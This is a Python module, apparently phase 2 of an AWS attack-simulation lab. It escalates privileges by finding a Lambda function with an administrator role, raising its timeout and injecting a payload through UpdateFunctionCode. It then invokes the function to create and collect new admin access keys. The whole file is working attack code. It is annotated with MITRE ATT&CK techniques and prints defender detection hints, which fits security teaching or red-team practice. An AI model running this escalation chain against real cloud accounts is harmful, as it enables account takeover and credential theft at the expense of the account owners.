"""
escalate.py -- Phase 2: Privilege Escalation via Lambda Code Injection

The critical phase: discover the overprivileged Lambda function, increase its
timeout, inject a malicious payload that creates admin access keys, invoke the
function, and harvest the resulting admin credentials.

This is the technique the real attacker used to go from ReadOnlyAccess to
AdministratorAccess in under 3 minutes.

MITRE ATT&CK Techniques:
  - T1580: Cloud Infrastructure Discovery (Lambda recon)
  - T1648: Serverless Execution (UpdateFunctionCode)
  - T1546: Event Triggered Execution (Lambda runs with admin role)
  - T1098.001: Additional Cloud Credentials (CreateAccessKey for admin)
"""
import io
import json
import os
import zipfile
from pathlib import Path
from typing import Any, Dict, Optional

import boto3
import botocore

from config import AttackConfig
from utils import (
    console,
    format_table,
    log_event,
    print_detection,
    print_error,
    print_info,
    print_step,
    print_success,
    print_warning,
    safe_api_call,
    wait_for_lambda_update,
)


def discover_lambda_target(
    config: AttackConfig,
) -> Dict[str, Any]:
    """
    Find the target Lambda function and examine its execution role.

    The attacker looks for Lambda functions whose execution role has
    powerful permissions. If the role has AdministratorAccess, any code
    injected into that function runs with full admin privileges.

    MITRE: T1580 (Cloud Infrastructure Discovery)

    Args:
        config: The attack configuration.

    Returns:
        Dict with function details and role policy information.
    """
    print_step(1, "Discovering Lambda escalation target")
    session = config.attacker_session
    lam = session.client("lambda")
    iam = session.client("iam")

    # Get full details about the target function
    func = lam.get_function(FunctionName=config.lambda_function_name)
    func_config = func["Configuration"]
    role_arn = func_config["Role"]
    role_name = role_arn.split("/")[-1]

    print_info(f"Function: {func_config['FunctionName']}")
    print_info(f"Runtime:  {func_config['Runtime']}")
    print_info(f"Handler:  {func_config['Handler']}")
    print_info(f"Timeout:  {func_config['Timeout']}s")
    print_info(f"Role:     {role_name}")

    # Check what policies the execution role has
    role_policies = iam.list_attached_role_policies(RoleName=role_name)
    policies = [
        p["PolicyName"]
        for p in role_policies.get("AttachedPolicies", [])
    ]

    result = {
        "function_name": func_config["FunctionName"],
        "runtime": func_config["Runtime"],
        "handler": func_config["Handler"],
        "timeout": func_config["Timeout"],
        "role_arn": role_arn,
        "role_name": role_name,
        "role_policies": policies,
    }

    if "AdministratorAccess" in policies:
        print_success(
            f"JACKPOT: Execution role has AdministratorAccess!"
        )
        print_warning(
            "Any code injected into this function will run with "
            "full admin privileges."
        )
    else:
        print_info(f"Role policies: {', '.join(policies)}")

    print_detection(
        "CIEM",
        "Lambda execution role has AdministratorAccess (excessive privilege)",
    )
    print_detection(
        "CSPM",
        "Lambda function has no code signing configuration",
    )
    return result


def increase_timeout(
    config: AttackConfig,
    new_timeout: int = 30,
) -> Dict[str, Any]:
    """
    Increase the Lambda function timeout from 3s to 30s.

    The original 3-second timeout is too short for the malicious payload
    to complete IAM API calls. The real attacker increased it to 30 seconds.

    Args:
        config: The attack configuration.
        new_timeout: New timeout in seconds (default: 30).

    Returns:
        Dict with the updated function configuration.
    """
    print_step(2, f"Increasing Lambda timeout to {new_timeout}s")
    session = config.attacker_session
    lam = session.client("lambda")

    response = lam.update_function_configuration(
        FunctionName=config.lambda_function_name,
        Timeout=new_timeout,
    )

    print_success(f"Timeout updated: 3s -> {new_timeout}s")
    print_info("Waiting for configuration update to complete...")

    # Wait for the update to propagate
    if not wait_for_lambda_update(lam, config.lambda_function_name):
        print_error("Lambda configuration update did not complete in time.")
        return {}

    print_success("Configuration update complete")
    print_detection(
        "CDR",
        "UpdateFunctionConfiguration: significant timeout increase",
    )
    return {
        "function_name": response["FunctionName"],
        "new_timeout": response["Timeout"],
    }


def inject_payload(
    config: AttackConfig,
) -> Dict[str, Any]:
    """
    Package and upload the malicious Lambda payload via UpdateFunctionCode.

    The payload file is named ec2_init.py to match the original Lambda handler
    (ec2_init.lambda_handler). This means no handler configuration change is
    needed -- one fewer API call in CloudTrail.

    The payload runs with the Lambda execution role's permissions
    (AdministratorAccess) and creates new access keys for the admin user.

    MITRE: T1648 (Serverless Execution)

    Args:
        config: The attack configuration.

    Returns:
        Dict with the updated code SHA256 hash.
    """
    print_step(3, "Injecting malicious payload into Lambda function")
    session = config.attacker_session
    lam = session.client("lambda")

    # Locate the payload file
    payload_path = Path(__file__).parent / "payloads" / "ec2_init.py"
    if not payload_path.exists():
        print_error(f"Payload file not found: {payload_path}")
        return {}

    # Read the payload and set the target admin username via replacement
    payload_code = payload_path.read_text()

    # Create an in-memory zip file containing the payload
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("ec2_init.py", payload_code)
    zip_buffer.seek(0)

    print_info(
        f"Payload packaged ({len(zip_buffer.getvalue())} bytes), "
        f"uploading to Lambda..."
    )

    # Upload the malicious code
    response = lam.update_function_code(
        FunctionName=config.lambda_function_name,
        ZipFile=zip_buffer.read(),
    )

    print_success(
        f"Code injected! New SHA256: "
        f"{response['CodeSha256'][:16]}..."
    )

    # Wait for code update to complete
    print_info("Waiting for code update to complete...")
    if not wait_for_lambda_update(lam, config.lambda_function_name):
        print_error("Lambda code update did not complete in time.")
        return {}

    print_success("Code update complete")
    print_detection(
        "CDR",
        "UpdateFunctionCode called by non-CI/CD identity",
    )
    print_detection(
        "CWP",
        "Lambda function code modified outside deployment pipeline",
    )
    return {
        "function_name": response["FunctionName"],
        "code_sha256": response["CodeSha256"],
    }


def invoke_and_harvest(
    config: AttackConfig,
) -> Dict[str, Any]:
    """
    Invoke the modified Lambda function and extract admin credentials
    from the response.

    When Lambda runs the injected code, it uses the execution role's
    AdministratorAccess permissions. The code creates a new access key
    for the admin user and returns it in the Lambda response.

    MITRE: T1098.001 (Additional Cloud Credentials)

    Args:
        config: The attack configuration.

    Returns:
        Dict with admin credentials (AccessKeyId, SecretAccessKey)
        and reconnaissance data from the Lambda response.
    """
    print_step(4, "Invoking Lambda and harvesting admin credentials")
    session = config.attacker_session
    lam = session.client("lambda")

    # Invoke the function with the target admin username in the event
    event_payload = json.dumps({
        "target_admin_user": config.admin_user_name,
    })

    response = lam.invoke(
        FunctionName=config.lambda_function_name,
        Payload=event_payload.encode("utf-8"),
    )

    # Read and parse the Lambda response
    response_payload = json.loads(
        response["Payload"].read().decode("utf-8")
    )

    # Check for function errors
    if "FunctionError" in response:
        print_error(
            f"Lambda execution failed: "
            f"{response_payload.get('errorMessage', 'Unknown error')}"
        )
        return {}

    # Parse the body (it's a JSON string inside the response)
    body = response_payload.get("body", "{}")
    if isinstance(body, str):
        body = json.loads(body)

    # Extract admin credentials
    admin_creds = body.get("admin_credentials", {})
    if not admin_creds:
        print_error("No admin credentials in Lambda response")
        if "key_creation_error" in body:
            err = body["key_creation_error"]
            print_error(f"Key creation error: {err}")
            if "LimitExceeded" in str(err):
                print_warning(
                    "The admin user has 2 access keys (AWS max). "
                    "Run ./cleanup.sh to remove attacker keys from a previous run, "
                    "then try again."
                )
        else:
            print_info(f"Response body: {json.dumps(body, indent=2)[:500]}")
        return {}

    # Check if the payload had to clean up an old key
    if "deleted_old_key" in body:
        print_warning(
            f"Deleted old attacker key {body['deleted_old_key']} "
            f"from previous run before creating new one"
        )

    access_key_id = admin_creds.get("AccessKeyId", "")
    secret_key = admin_creds.get("SecretAccessKey", "")

    print_success(
        f"ADMIN CREDENTIALS OBTAINED: {access_key_id[:8]}..."
    )
    print_info(f"Lambda identity: {body.get('identity', 'N/A')}")

    # Display user enumeration results from Lambda
    users = body.get("users", {})
    if users:
        rows = []
        for uname, udata in users.items():
            if isinstance(udata, dict):
                policies = ", ".join(udata.get("policies", []))
                keys = str(udata.get("access_key_count", "?"))
                rows.append([uname, policies, keys])
        if rows:
            table = format_table(
                "IAM Users (from Lambda Recon)",
                ["User", "Policies", "Access Keys"],
                rows,
                ["bright_cyan", "bright_yellow", "white"],
            )
            console.print(table)

    # Store the admin credentials in the config for subsequent phases
    config.set_admin_credentials(access_key_id, secret_key)
    log_event(
        "success",
        "Admin credentials harvested",
        phase=2,
        step=4,
        data={"access_key_id": access_key_id, "target_user": config.admin_user_name},
    )

    print_detection(
        "CDR",
        "CreateAccessKey for admin user called from Lambda execution role",
    )
    return {
        "admin_credentials": admin_creds,
        "lambda_identity": body.get("identity", ""),
        "users_enumerated": body.get("users", {}),
        "buckets": body.get("buckets", []),
    }


def verify_admin_access(config: AttackConfig) -> Dict[str, str]:
    """
    Confirm that the harvested credentials have administrator access.

    Args:
        config: The attack configuration (admin session must be set).

    Returns:
        Dict with the admin identity details.
    """
    print_step(5, "Verifying admin access")
    admin = config.require_admin_session()
    sts = admin.client("sts")
    identity = sts.get_caller_identity()

    result = {
        "UserId": identity["UserId"],
        "Account": identity["Account"],
        "Arn": identity["Arn"],
    }

    print_success(f"Confirmed admin: {result['Arn']}")
    print_info(
        "Full administrative control achieved. "
        "Attack time: ~8 minutes."
    )
    return result


def run_phase(config: AttackConfig) -> Dict[str, Any]:
    """
    Execute the complete Phase 2: Privilege Escalation.

    Returns a dict with all results from this phase.
    """
    from utils import print_phase_banner

    print_phase_banner(2, "PRIVILEGE ESCALATION")

    results = {}
    results["lambda_target"] = discover_lambda_target(config)
    results["timeout_update"] = increase_timeout(config)
    results["code_injection"] = inject_payload(config)
    results["harvest"] = invoke_and_harvest(config)

    if results["harvest"].get("admin_credentials"):
        results["admin_verification"] = verify_admin_access(config)
    else:
        print_error("Escalation failed: no admin credentials obtained.")

    return results
